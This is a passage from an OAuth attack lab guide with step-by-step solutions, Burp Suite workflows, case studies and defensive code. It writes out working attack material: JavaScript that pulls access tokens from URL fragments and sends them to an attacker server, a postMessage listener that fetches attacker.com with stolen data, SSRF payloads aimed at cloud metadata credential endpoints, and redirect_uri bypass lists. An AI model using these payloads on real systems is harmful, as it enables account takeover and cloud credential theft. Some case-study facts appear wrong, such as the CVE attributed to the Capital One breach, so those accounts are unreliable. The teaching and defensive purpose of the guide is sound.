# Note: Fragment (#access_token=...) preserved in browser but not sent
```

**Response 3: Open Redirect Forwards to Attacker**
```http
HTTP/1.1 302 Found
Location: https://exploit-server.net/exploit
# Browser appends fragment: https://exploit-server.net/exploit#access_token=VICTIM_TOKEN
```

**Request 4: Exploit Page Loads with Token Fragment**
```http
GET /exploit HTTP/1.1
Host: exploit-server.net
# Fragment still not sent, only JavaScript can access it
```

**JavaScript Executes:**
```javascript
// Read fragment
var token = window.location.hash.substring(1);
// Redirect to exfiltrate
window.location = '/?stolen=' + token;
```

**Request 5: Token Exfiltrated to Access Logs**
```http
GET /?stolen=access_token%3DVICTIM_TOKEN%26expires_in%3D3600... HTTP/1.1
Host: exploit-server.net
```

**Request 6: Attacker Uses Stolen Token**
```http
GET /me HTTP/1.1
Host: oauth-server.net
Authorization: Bearer VICTIM_TOKEN

HTTP/1.1 200 OK
{"sub":"administrator","apikey":"ADMIN_KEY"}
```

#### Burp Suite Techniques

1. **Repeater**: Test directory traversal in redirect_uri
2. **Proxy**: Identify open redirect vulnerabilities
3. **Decoder**: URL decode/encode parameters and log entries
4. **Repeater**: Test /me endpoint with stolen tokens
5. **Exploit Server**: Host iframe and JavaScript for token extraction

#### Common Mistakes

- ❌ Not storing JavaScript exploit at `/exploit` path first
- ❌ Forgetting that fragments are client-side only
- ❌ Missing URL encoding in redirect_uri parameter
- ❌ Testing exploit without checking browser console
- ❌ Not using unique nonce for each request
- ❌ Incorrect URL decoding of access log entries

#### Troubleshooting

**No Token in Access Logs:**
- Verify JavaScript exploit is stored at `/exploit` path
- Check browser console for JavaScript errors
- Ensure open redirect works with your exploit server URL
- Victim must have active OAuth session

**Directory Traversal Doesn't Work:**
- Test exact format: `/oauth-callback/../path`
- Ensure no extra characters or spaces
- Try URL encoding the traversal sequence
- Verify whitelist includes base domain

**Open Redirect Fails:**
- Test redirect with curl to see actual redirect
- Check if URL encoding is required for path parameter
- Verify full URL including protocol (https://)
- Some applications block external redirects

**Token Invalid or Expired:**
- Access tokens typically expire in 3600 seconds
- Extract and use token quickly
- Verify you're using complete token value
- Check Authorization header format

#### Real-World Impact

**Similar Vulnerabilities:**
- Instagram OAuth token theft (bug bounty)
- Yahoo OAuth open redirect chain
- Microsoft Azure AD redirect_uri bypasses

**Consequences:**
- Account takeover via stolen access tokens
- API access with victim's permissions
- Data exfiltration from OAuth-protected resources
- Privilege escalation in enterprise applications

**Attack Variations:**
- XSS instead of open redirect
- Subdomain takeover for whitelisted domains
- HTTP parameter pollution
- CRLF injection in redirect parameters

#### Defense Requirements

1. **Strict redirect_uri Validation**:
   - Exact match (no prefix matching)
   - Prevent directory traversal
   - Canonicalize URLs before comparison

2. **Eliminate Open Redirects**:
   - Use indirect reference maps
   - Whitelist redirect destinations
   - Validate all redirect parameters

3. **Use Authorization Code Flow**:
   - Tokens not exposed in URLs
   - Requires client_secret for exchange
   - Implement PKCE for public clients

4. **Additional Protections**:
   - Short token lifetimes
   - Bind tokens to clients
   - Monitor for suspicious redirects

---

### Lab 6: SSRF via OpenID Dynamic Client Registration

**Lab Details**
- **Difficulty**: Practitioner
- **Objective**: Exploit dynamic client registration to perform SSRF and steal admin AWS credentials
- **Vulnerability**: Unauthenticated client registration + unsafe processing of `logo_uri` parameter

#### Vulnerability Description

The OAuth service supports OpenID Connect dynamic client registration without authentication. When clients register with a `logo_uri`, the OAuth server fetches this resource to display on authorization pages. The server doesn't validate or sandbox these URIs, allowing attackers to:
1. Register clients with malicious `logo_uri` pointing to internal resources
2. Force OAuth server to make requests to arbitrary URLs (SSRF)
3. Access cloud metadata endpoints (AWS EC2 metadata service)
4. Extract sensitive credentials via SSRF

#### Step-by-Step Solution

**Step 1: Access OpenID Configuration**

Navigate to well-known OpenID configuration endpoint:

```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Response:**
```json
{
  "issuer": "https://oauth-YOUR-OAUTH-SERVER.oauth-server.net",
  "authorization_endpoint": "https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/auth",
  "token_endpoint": "https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/token",
  "registration_endpoint": "https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/reg",
  "jwks_uri": "https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/jwks",
  "response_types_supported": ["code", "token"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256"],
  "scopes_supported": ["openid", "profile", "email"]
}
```

**Key Finding**: `registration_endpoint` at `/reg` - dynamic client registration is enabled!

**Step 2: Register Test Client**

Send POST request to register a client (no authentication required):

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"]
}
```

**Response:**
```json
{
  "client_id": "ABC123XYZ789",
  "client_id_issued_at": 1641234567,
  "redirect_uris": ["https://example.com"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "application_type": "web",
  "token_endpoint_auth_method": "client_secret_basic",
  "client_secret": "generated-secret-here"
}
```

✅ **Unauthenticated Registration Works!**

**Step 3: Identify Logo Retrieval Mechanism**

The OAuth server serves client logos at: `/client/CLIENT-ID/logo`

Test accessing this endpoint:

```http
GET /client/ABC123XYZ789/logo HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net

HTTP/1.1 404 Not Found
```

404 expected since we didn't specify `logo_uri` during registration.

**Step 4: Proof-of-Concept with Burp Collaborator**

1. Open Burp Collaborator client
2. Copy a Collaborator subdomain (e.g., `abc123.burpcollaborator.net`)
3. Register client with Collaborator URL:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "https://abc123.burpcollaborator.net/logo.png"
}
```

**Response:**
```json
{
  "client_id": "NEW-CLIENT-ID-456",
  "logo_uri": "https://abc123.burpcollaborator.net/logo.png",
  ...
}
```

4. Request the logo endpoint:

```http
GET /client/NEW-CLIENT-ID-456/logo HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

5. Check Burp Collaborator - you should see HTTP request from OAuth server!

**Collaborator Interaction:**
```
HTTP request received:
GET /logo.png HTTP/1.1
Host: abc123.burpcollaborator.net
User-Agent: Mozilla/5.0 (compatible; OAuthServer/1.0)
```

✅ **SSRF Confirmed**: OAuth server fetches specified `logo_uri`!

**Step 5: SSRF Attack - Target AWS Metadata**

AWS EC2 instances expose metadata at `http://169.254.169.254`:

**AWS Metadata Endpoints:**
- `/latest/meta-data/` - Instance metadata
- `/latest/meta-data/iam/security-credentials/` - IAM role list
- `/latest/meta-data/iam/security-credentials/ROLE_NAME/` - Temporary credentials

Register client targeting AWS metadata:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

**Response:**
```json
{
  "client_id": "MALICIOUS-CLIENT-ID-789",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  ...
}
```

**Step 6: Extract AWS Credentials**

Request the logo endpoint to retrieve SSRF response:

```http
GET /client/MALICIOUS-CLIENT-ID-789/logo HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
```

**Response Body (AWS Metadata - IAM Credentials):**
```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-10T12:34:56Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAYEXAMPLEKEY12345",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEHoaCXVzLWVhc3QtMSJIMEYCIQD...",
  "Expiration": "2024-01-10T18:34:56Z"
}
```

**Step 7: Submit Solution**

1. Extract `SecretAccessKey` value from response
2. Submit via lab interface: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
3. Lab solved! ✅

#### HTTP Request/Response Flow

**Complete SSRF Attack:**

**Request 1: Discover Registration Endpoint**
```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-server.net

HTTP/1.1 200 OK
{
  "registration_endpoint": "https://oauth-server.net/reg"
}
```

**Request 2: Register Client with Malicious logo_uri**
```http
POST /reg HTTP/1.1
Host: oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

HTTP/1.1 201 Created
{
  "client_id": "MALICIOUS-CLIENT",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

**Request 3: Trigger SSRF via Logo Retrieval**
```http
GET /client/MALICIOUS-CLIENT/logo HTTP/1.1
Host: oauth-server.net

HTTP/1.1 200 OK
Content-Type: application/json

{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "SECRET_KEY_HERE",
  "Token": "TOKEN_HERE"
}
```

**Behind the Scenes (OAuth Server Internal Request):**
```http
GET /latest/meta-data/iam/security-credentials/admin/ HTTP/1.1
Host: 169.254.169.254

HTTP/1.1 200 OK
{
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  ...
}
```

#### Burp Suite Techniques

1. **Repeater**: Craft and modify JSON registration requests
2. **Burp Collaborator**: Verify out-of-band interactions and SSRF
3. **JSON Formatting**: Proper Content-Type headers and payload structure
4. **Response Analysis**: Extract sensitive data from HTTP responses
5. **Request Chaining**: Register client → retrieve logo in sequence

#### Common Mistakes

- ❌ Forgetting Content-Type: application/json header
- ❌ Missing `redirect_uris` parameter (required field)
- ❌ Using HTTPS for AWS metadata (must be HTTP)
- ❌ Incorrect IAM role path (enumerate roles first if unknown)
- ❌ Not URL-encoding special characters in logo_uri
- ❌ Attempting to reuse client_id (each registration creates new ID)

#### Troubleshooting

**Registration Fails:**
- Ensure Content-Type is application/json
- Verify redirect_uris is an array: `["https://example.com"]`
- Check JSON syntax (trailing commas, quotes)
- Some servers require additional fields (check error message)

**Logo Endpoint Returns 404:**
- Verify you're using correct client_id from registration response
- Check that logo_uri was included in registration
- Ensure path is `/client/CLIENT-ID/logo` (not `/clients` or other variations)

**AWS Metadata Not Accessible:**
- OAuth server must be running on AWS EC2
- Try listing roles first: `/latest/meta-data/iam/security-credentials/`
- Use HTTP (not HTTPS) for metadata endpoint
- IMDSv2 may require token (try IMDSv1 endpoint)
- Check if WAF/firewall blocks metadata access

**No Credentials in Response:**
- Role name may be different than "admin" - enumerate first
- Server may filter/sanitize logo responses
- Try different metadata endpoints
- Check response content-type and body

#### Real-World Impact

**AWS Metadata SSRF:**
- **Capital One Breach (2019)**: SSRF to AWS metadata exposed 106M records, $80M fine
- IMDSv1 allows unauthenticated metadata access
- Credentials provide temporary AWS API access
- Can escalate to full account compromise

**Similar Vulnerabilities:**
- VMware vCenter (CVE-2021-21972 CVSS 9.8) - SSRF to RCE
- Grafana (CVE-2020-13379) - SSRF via avatar_url
- Oracle E-Business Suite (CVE-2025-61882) - SSRF in multiple components

**Cloud Metadata Targets:**

**AWS (169.254.169.254):**
```
/latest/meta-data/iam/security-credentials/
/latest/user-data
/latest/meta-data/hostname
/latest/meta-data/instance-id
```

**Azure (metadata.azure.com):**
```
/metadata/instance?api-version=2021-02-01
/metadata/identity/oauth2/token
```

**Google Cloud (metadata.google.internal):**
```
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/project/project-id
```

**DigitalOcean (169.254.169.254):**
```
/metadata/v1/
/metadata/v1/user-data
```

#### Attack Variations

**1. Internal Network Scanning:**
```json
{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://192.168.1.1:8080/admin"
}
```

**2. SSRF via Other Parameters:**
- `jwks_uri` - JWK Set endpoint
- `sector_identifier_uri` - Sector identifier
- `initiate_login_uri` - Login initiation
- `request_uris` - Request object URIs

**3. Protocol Smuggling:**
```json
{
  "logo_uri": "gopher://internal-server:70/_payload"
}
```

**4. CRLF Injection:**
```json
{
  "logo_uri": "http://internal-server/%0d%0aHeader-Injection: payload"
}
```

#### Defense Requirements

**1. Disable Dynamic Registration:**
- Only allow pre-registered clients
- Require authentication for registration
- Implement client approval workflow

**2. Validate External Resources:**
- Whitelist allowed domains for logo_uri
- Block private IP ranges (RFC 1918)
- Block cloud metadata IPs (169.254.169.254)
- Block localhost (127.0.0.1, ::1)
- Use DNS rebinding protection

**3. Sandbox Resource Fetching:**
- Fetch logos in isolated environment
- Apply request timeouts
- Limit response size
- Disable redirect following
- Validate content types

**4. Apply Least Privilege:**
- EC2 instances should not need IMDSv1
- Enable IMDSv2 (requires token)
- Use minimal IAM role permissions
- Implement network segmentation

**5. Monitor and Alert:**
- Log all registration attempts
- Alert on metadata endpoint access
- Monitor for unusual logo_uri patterns
- Implement rate limiting

---

## Common OAuth Vulnerabilities

### 1. Improper Implicit Grant Implementation

**Vulnerability**: Client application fails to validate that access tokens match submitted user data.

**Attack**: Modify email/username in POST requests while keeping stolen access token.

**Example**:
```json
POST /authenticate
{
  "email": "victim@example.com",
  "token": "attacker_token"
}
```

**Prevention**:
- Always validate tokens server-side
- Verify token subject matches claimed user
- Use authorization code flow instead of implicit
- Never trust client-supplied user data

### 2. Missing state Parameter (CSRF)

**Vulnerability**: Authorization requests lack `state` parameter for CSRF protection.

**Attack**: Force victim to link attacker's OAuth profile to their account.

**Example**:
```html
<iframe src="https://victim.com/oauth-linking?code=attacker_code"></iframe>
```

**Prevention**:
- Always include random `state` parameter
- Validate state matches session
- Implement additional CSRF tokens
- Bind authorization requests to sessions

### 3. Weak redirect_uri Validation

**Vulnerability**: OAuth provider accepts arbitrary redirect_uri values.

**Attack Types**:
- **Complete Bypass**: Any domain accepted
- **Prefix Matching**: `https://victim.com` matches `https://victim.com.attacker.com`
- **Directory Traversal**: `https://victim.com/oauth-callback/../evil`
- **Open Redirect Chains**: Redirect to whitelisted page that redirects elsewhere

**Examples**:
```
# Complete bypass
redirect_uri=https://attacker.com

# Prefix matching bypass
redirect_uri=https://victim.com.attacker.com

# Directory traversal
redirect_uri=https://victim.com/oauth-callback/../post/next?path=https://attacker.com

# Parameter pollution
redirect_uri=https://victim.com&redirect_uri=https://attacker.com
```

**Prevention**:
- Exact string matching (no prefix matching)
- Prevent directory traversal
- Canonicalize URLs before comparison
- Whitelist specific redirect_uris per client
- Block open redirect vulnerabilities

### 4. Scope Validation Flaws

**Vulnerability**: Applications don't validate that granted scopes match requested scopes.

**Attack**: Request limited scope, then escalate to higher privileges.

**Example**:
```
# Request minimal scope
GET /auth?scope=profile

# Modify token request
POST /token
scope=admin+delete_users
```

**Prevention**:
- Validate scopes at authorization time
- Re-validate scopes when using tokens
- Apply least privilege principle
- Audit scope escalation attempts

### 5. Unverified User Registration

**Vulnerability**: OAuth providers allow registration with unverified email addresses.

**Attack**: Register OAuth account with victim's email before victim does.

**Attack Flow**:
1. Attacker registers on OAuth provider with victim@example.com
2. OAuth provider doesn't verify email ownership
3. Victim tries to link OAuth account on target site
4. Target site trusts email from OAuth provider
5. Victim's account linked to attacker's OAuth profile

**Prevention**:
- Verify email addresses before allowing OAuth use
- Implement email confirmation flow
- Don't trust email claims from OAuth providers
- Match OAuth accounts to existing accounts carefully

### 6. Authorization Code Interception

**Vulnerability**: Authorization codes exposed in browser history, logs, or referrer headers.

**Attack Vectors**:
- Browser history access
- Referer header leakage
- Server log inspection
- Network traffic monitoring

**Example**:
```
# Code in URL
https://victim.com/callback?code=SENSITIVE_CODE

# Leaked via Referer
GET /external-resource HTTP/1.1
Referer: https://victim.com/callback?code=SENSITIVE_CODE
```

**Prevention**:
- Use authorization code flow with PKCE
- Short code lifetimes (60 seconds)
- Bind codes to client_id
- Use state parameter
- Validate redirect_uri on token exchange

### 7. Token Leakage via postMessage

**Vulnerability**: Applications use `postMessage()` with wildcard origin or leak URLs containing tokens.

**Attack**: Malicious page receives tokens via insecure messaging.

**Example**:
```javascript
// Vulnerable code
parent.postMessage(window.location.href, '*')

// Attacker code
window.addEventListener('message', function(e) {
  // Receives URL with #access_token=...
  fetch('https://attacker.com/?stolen=' + e.data)
})
```

**Prevention**:
- Specify explicit target origins
- Validate message origins in listeners
- Never send tokens via postMessage
- Use authorization code flow instead of implicit

### 8. SSRF via Resource Parameters

**Vulnerability**: OAuth providers fetch external resources without validation.

**Attack Vectors**:
- logo_uri in dynamic client registration
- jwks_uri for key sets
- sector_identifier_uri
- request_uris

**Example**:
```json
POST /reg
{
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Prevention**:
- Disable dynamic client registration
- Whitelist allowed domains
- Block private IP ranges
- Sandbox resource fetching
- Validate content types

---

## Attack Techniques Summary

### 1. Authorization Code Theft

**Techniques**:
- Weak redirect_uri validation bypass
- Open redirect chains
- OAuth profile linking CSRF
- Referer header leakage

**Exploitation**:
```
1. Craft malicious authorization URL with attacker redirect_uri
2. Social engineer victim to click link (authenticated session)
3. Capture authorization code from attacker's server
4. Exchange code for access token at victim application
```

**Impact**: Complete account takeover

### 2. Access Token Theft

**Techniques**:
- Directory traversal in redirect_uri
- postMessage vulnerabilities
- Open redirect chains
- XSS to extract tokens from URL fragments

**Exploitation**:
```
1. Chain redirect_uri traversal with open redirect
2. Force OAuth flow to redirect to attacker domain with token in fragment
3. Use JavaScript to extract token from URL
4. Exfiltrate token to attacker server
5. Use stolen token to access victim's resources
```

**Impact**: API access, data exfiltration

### 3. CSRF Account Linking

**Techniques**:
- Missing state parameter
- Predictable state values
- State not bound to session

**Exploitation**:
```
1. Initiate OAuth linking with attacker's account
2. Capture authorization code
3. Drop request (preserve code validity)
4. Craft CSRF payload with stolen code
5. Victim's authenticated session links attacker's profile
6. Attacker logs in via OAuth to access victim account
```

**Impact**: Account hijacking

### 4. Parameter Manipulation

**Techniques**:
- Client-side data tampering
- JSON parameter injection
- Scope escalation
- User identifier substitution

**Exploitation**:
```
1. Complete normal OAuth flow
2. Intercept authentication request to application
3. Modify email/user_id/role parameters
4. Keep original access token
5. Application authenticates as modified user
```

**Impact**: Authentication bypass, privilege escalation

### 5. SSRF via Client Registration

**Techniques**:
- Unauthenticated dynamic registration
- Unsafe logo_uri processing
- Cloud metadata access
- Internal network scanning

**Exploitation**:
```
1. Discover OpenID configuration endpoint
2. Register client with malicious logo_uri (internal endpoint)
3. Request client logo to trigger SSRF
4. Extract internal resource content from logo response
```

**Impact**: Cloud credential theft, internal resource access

### 6. Token Replay

**Techniques**:
- Stolen access tokens
- Lack of token binding
- Missing audience validation

**Exploitation**:
```
1. Steal access token (phishing, XSS, SSRF, logs)
2. Use token against OAuth-protected API
3. Impersonate victim
4. Access sensitive resources
```

**Impact**: Unauthorized API access

---

## Burp Suite Workflows

### Workflow 1: OAuth Flow Analysis

**Objective**: Map complete OAuth implementation and identify vulnerabilities

**Steps**:

1. **Configure Browser Proxy**
   - Set browser to proxy through Burp (127.0.0.1:8080)
   - Ensure HTTPS interception is enabled
   - Add OAuth domain to Burp's target scope

2. **Complete Normal OAuth Flow**
   - Log in via OAuth
   - Complete all steps (authorization, callback, authentication)

3. **Analyze HTTP History**
   ```
   Proxy > HTTP history
   Filter: Show only in-scope items

   Look for:
   - Authorization request: GET /auth?client_id=...
   - Authorization callback: GET /callback?code=... or #access_token=...
   - Token exchange: POST /token (for code flow)
   - Application authentication: POST /authenticate, POST /login
   - User info: GET /userinfo, GET /me
   ```

4. **Identify Key Parameters**
   - client_id
   - redirect_uri
   - response_type (code, token)
   - scope
   - state (CSRF protection)
   - nonce (replay protection)

5. **Test Parameter Manipulation**
   - Send requests to Repeater
   - Modify each parameter systematically
   - Document responses and behaviors

### Workflow 2: redirect_uri Validation Testing

**Objective**: Identify weak redirect_uri validation

**Steps**:

1. **Baseline Test**
   ```http
   GET /auth?client_id=xyz&redirect_uri=https://victim.com/callback&response_type=code HTTP/1.1
   ```

2. **Complete Domain Change**
   ```http
   redirect_uri=https://attacker.com
   ```
   Expected: Rejected
   If accepted: Critical vulnerability

3. **Prefix Matching Test**
   ```http
   redirect_uri=https://victim.com.attacker.com
   redirect_uri=https://victim.com@attacker.com
   redirect_uri=https://victim.com%2eattacker.com
   ```

4. **Directory Traversal**
   ```http
   redirect_uri=https://victim.com/callback/../
   redirect_uri=https://victim.com/callback/../evil
   redirect_uri=https://victim.com/callback/..%2fevil
   ```

5. **Parameter Pollution**
   ```http
   redirect_uri=https://victim.com&redirect_uri=https://attacker.com
   redirect_uri=https://victim.com%26redirect_uri=https://attacker.com
   ```

6. **Open Redirect Chains**
   ```http
   redirect_uri=https://victim.com/redirect?url=https://attacker.com
   ```

7. **Subdomain Variations**
   ```http
   redirect_uri=https://evil.victim.com
   redirect_uri=https://attacker-victim.com
   ```

**Burp Repeater Configuration**:
- Right-click authorization request > Send to Repeater
- Modify redirect_uri parameter
- Send request and analyze Location header in response
- Document which variations are accepted

### Workflow 3: CSRF Testing (Missing state Parameter)

**Objective**: Test for CSRF vulnerabilities in OAuth flows

**Steps**:

1. **Check for state Parameter**
   ```http
   GET /auth?client_id=xyz&redirect_uri=...&response_type=code&state=RANDOM_VALUE
   ```
   If missing: Potential CSRF vulnerability

2. **Test State Validation**
   ```
   # Complete OAuth flow normally
   GET /auth?...&state=abc123

   # Callback with different state
   GET /callback?code=...&state=different_value
   ```
   If accepted: State not validated

3. **Capture Fresh Authorization Code**
   - Burp Proxy > Intercept ON
   - Initiate OAuth flow
   - Intercept callback: `GET /callback?code=...`
   - Right-click > Do intercept > Response to this request
   - **Drop both request and response** (preserves code)
   - Copy authorization code from URL

4. **Create CSRF Exploit**
   ```html
   <iframe src="https://victim.com/callback?code=STOLEN_CODE"></iframe>
   ```

5. **Test CSRF Attack**
   - Store exploit on exploit server
   - Visit exploit as authenticated victim
   - Check if attacker's OAuth profile links to victim account

### Workflow 4: Access Token Extraction

**Objective**: Steal OAuth access tokens from URL fragments

**Steps**:

1. **Identify Implicit Flow**
   ```http
   GET /auth?...&response_type=token

   # Callback contains token in fragment
   https://victim.com/callback#access_token=TOKEN&expires_in=3600
   ```

2. **Test Directory Traversal in redirect_uri**
   ```http
   redirect_uri=https://victim.com/callback/../post/next
   ```

3. **Identify Open Redirect**
   ```
   Browse application for redirect functionality:
   - /redirect?url=
   - /goto?destination=
   - /next?path=
   - /post/next?path=
   ```

4. **Chain Vulnerabilities**
   ```http
   redirect_uri=https://victim.com/callback/../redirect?url=https://attacker.com
   ```
   Result: Token in fragment arrives at attacker domain

5. **Create Token Extraction Exploit**
   ```html
   <!-- Exploit server /exploit page -->
   <script>
   if (window.location.hash) {
     window.location = '/?token=' + window.location.hash.substring(1)
   }
   </script>

   <!-- Exploit server main page -->
   <iframe src="https://oauth.com/auth?redirect_uri=...&response_type=token"></iframe>
   ```

6. **Extract Token from Logs**
   - Deliver exploit to victim
   - Check exploit server access logs
   - URL decode token parameter
   - Extract access_token value

7. **Use Stolen Token**
   ```http
   GET /me HTTP/1.1
   Host: oauth-server.com
   Authorization: Bearer STOLEN_TOKEN
   ```

### Workflow 5: SSRF via Client Registration

**Objective**: Exploit dynamic client registration for SSRF

**Steps**:

1. **Discover OpenID Configuration**
   ```http
   GET /.well-known/openid-configuration HTTP/1.1
   Host: oauth-server.com
   ```

2. **Test Client Registration**
   ```http
   POST /reg HTTP/1.1
   Host: oauth-server.com
   Content-Type: application/json

   {
     "redirect_uris": ["https://example.com"]
   }
   ```
   If 201 Created: Registration enabled

3. **Verify SSRF with Burp Collaborator**
   - Burp menu > Burp Collaborator client > Copy subdomain
   ```json
   {
     "redirect_uris": ["https://example.com"],
     "logo_uri": "https://abc123.burpcollaborator.net/test"
   }
   ```
   - Request: `GET /client/CLIENT_ID/logo`
   - Check Collaborator for HTTP request

4. **Target Internal Resources**
   ```json
   {
     "logo_uri": "http://localhost:8080/admin"
   }
   {
     "logo_uri": "http://192.168.1.1/config"
   }
   {
     "logo_uri": "http://169.254.169.254/latest/meta-data/"
   }
   ```

5. **Extract Cloud Metadata**
   ```json
   {
     "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
   }
   ```
   - Register client
   - Request logo endpoint
   - Extract AWS credentials from response

### Workflow 6: Burp Extensions for OAuth Testing

**Recommended Extensions**:

1. **OAuth Scan**
   - Automatically detects OAuth flows
   - Tests common vulnerabilities
   - Reports missing security parameters

2. **Burp Collaborator Everywhere**
   - Injects Collaborator payloads into parameters
   - Useful for detecting blind SSRF in logo_uri

3. **Param Miner**
   - Discovers hidden parameters
   - Identifies unkeyed inputs in OAuth flows

4. **AuthMatrix**
   - Tests access control across OAuth scopes
   - Matrix-based permission testing

5. **Turbo Intruder**
   - High-speed parameter fuzzing
   - Race condition testing in token exchange

**Installation**:
```
Extender > BApp Store > Search for extension > Install
```

---

## Real-World Exploitation

### Case Study 1: Instagram OAuth Token Theft (Bug Bounty)

**Vulnerability**: redirect_uri validation bypass via directory traversal

**Attack Flow**:
```
1. Instagram whitelisted: https://www.instagram.com/oauth/callback/
2. Attacker discovered open redirect: /redirect?url=
3. Chained vulnerabilities:
   redirect_uri=https://www.instagram.com/oauth/callback/../redirect?url=https://attacker.com
4. OAuth tokens in URL fragment leaked to attacker domain
```

**Impact**: Account takeover, $20,000 bug bounty

**Lessons**:
- Exact match redirect_uri validation
- Eliminate open redirects
- Use authorization code flow with PKCE

### Case Study 2: Facebook OAuth CSRF (Historical)

**Vulnerability**: Missing state parameter in OAuth implementation

**Attack Flow**:
```
1. Facebook OAuth lacked state parameter validation
2. Attacker initiated OAuth flow and captured authorization code
3. Dropped request to preserve code validity
4. Crafted CSRF payload with stolen code
5. Victim's authenticated session linked attacker's Facebook to their account
6. Attacker gained full account access via Facebook login
```

**Impact**: Mass account takeover potential, $10,000-$40,000 bounties

**Fix**: Facebook implemented mandatory state parameter validation

### Case Study 3: Capital One AWS Metadata Breach (CVE-2019-9597)

**Vulnerability**: SSRF to AWS EC2 metadata service

**Attack Flow**:
```
1. Firewall misconfiguration allowed SSRF
2. Attacker accessed EC2 metadata endpoint
3. Extracted IAM role credentials
4. Used credentials to access S3 buckets
5. Exfiltrated 100M+ customer records
```

**Impact**:
- 106 million customer records exposed
- $80 million fine
- Criminal charges filed

**Lessons**:
- Block access to 169.254.169.254
- Enable IMDSv2 (requires token)
- Apply network segmentation
- Monitor metadata endpoint access

### Case Study 4: GitLab OAuth Account Takeover (CVE-2019-9074)

**Vulnerability**: Race condition in OAuth account linking

**Attack Flow**:
```
1. GitLab OAuth linking lacked proper concurrency controls
2. Attacker sent parallel requests linking same OAuth account
3. Race condition allowed linking to multiple accounts
4. Attacker gained access to victim accounts
```

**Impact**: Critical severity, account takeover

**Fix**: Implemented proper locking mechanisms for account linking

### Case Study 5: Slack OAuth Token Leakage (2015)

**Vulnerability**: OAuth tokens logged in server logs and analytics

**Attack Flow**:
```
1. Slack used implicit flow (tokens in URL fragments)
2. JavaScript analytics sent full URLs to third-party services
3. URL fragments (with tokens) included in Referer headers
4. Tokens leaked to external analytics providers
5. Long-lived tokens allowed persistent account access
```

**Impact**: Token exposure, potential account compromise

**Fix**:
- Switched to authorization code flow
- Removed analytics from OAuth callback pages
- Shortened token lifetimes

### Case Study 6: Microsoft OAuth redirect_uri Bypass (2020)

**Vulnerability**: Subdomain validation bypass

**Attack Flow**:
```
1. Microsoft whitelisted *.microsoft.com for redirect_uri
2. Attacker discovered subdomain takeover on abandoned.microsoft.com
3. Registered abandoned subdomain via third-party service
4. Used controlled subdomain for redirect_uri
5. Stole authorization codes and tokens
```

**Impact**: Account takeover, $15,000 bug bounty

**Lessons**:
- Maintain subdomain inventory
- Monitor for subdomain takeovers
- Use specific redirect_uri whitelist, not wildcards

### Case Study 7: Yahoo OAuth Open Redirect Chain (2019)

**Vulnerability**: Multiple open redirects chained with OAuth

**Attack Flow**:
```
1. Yahoo OAuth validated redirect_uri against whitelist
2. Attacker found open redirect on whitelisted domain
3. Chained redirects:
   redirect_uri=https://yahoo.com/redirect?dest=https://yahoo.com.evil.com/redirect?final=https://attacker.com
4. Complex redirect chain bypassed validation
5. Authorization codes leaked to attacker
```

**Impact**: Account takeover, $10,000 bounty

**Fix**: Eliminated open redirects, stricter URL validation

### Case Study 8: Uber OAuth Scope Escalation (2018)

**Vulnerability**: Insufficient scope validation

**Attack Flow**:
```
1. Uber OAuth app requested "profile" scope
2. Attacker modified token request to include "admin" scope
3. OAuth server granted elevated privileges without re-authorization
4. Attacker gained administrative access
5. Accessed internal tools and driver information
```

**Impact**: Data breach, privilege escalation

**Fix**: Strict scope validation at token issuance and usage

### Defense Strategies from Real-World Attacks

**1. redirect_uri Validation**:
```python
# Bad - Prefix matching
if redirect_uri.startswith(WHITELIST):
    allow()

# Good - Exact match
if redirect_uri in EXACT_WHITELIST:
    allow()

# Better - Exact match with canonicalization
canonical_uri = canonicalize_url(redirect_uri)
if canonical_uri in EXACT_WHITELIST:
    allow()
```

**2. State Parameter Implementation**:
```python
# Generate state
state = generate_random_token()
session['oauth_state'] = state

# Validate state
if request.args.get('state') != session.get('oauth_state'):
    raise CSRFError()
session.pop('oauth_state')  # One-time use
```

**3. SSRF Prevention**:
```python
# Bad - No validation
logo_url = client_registration['logo_uri']
response = requests.get(logo_url)

# Good - Validate and restrict
BLOCKED_IPS = ['127.0.0.1', '169.254.169.254', '10.0.0.0/8', '192.168.0.0/16']
if is_ip_blocked(logo_url, BLOCKED_IPS):
    raise SecurityError()
response = requests.get(logo_url, timeout=5, allow_redirects=False)
```

**4. Token Security**:
```python
# Use authorization code flow with PKCE
